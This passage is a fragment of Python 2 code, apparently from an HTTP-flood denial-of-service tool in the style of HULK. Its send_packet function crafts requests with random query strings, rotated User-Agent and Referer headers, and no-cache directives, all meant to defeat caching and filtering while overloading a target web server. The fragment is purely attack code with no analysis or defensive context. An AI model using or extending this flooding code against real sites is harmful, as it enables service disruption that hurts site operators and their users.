...
def send_packet(host,param_joiner):
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(1,6)) + '=' + buildblock(random.randint(1,6)))
	request.add_header('User-Agent', random.choice(headers_useragents))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(1,6)))
	request.add_header('Keep-Alive', random.randint(1,6))
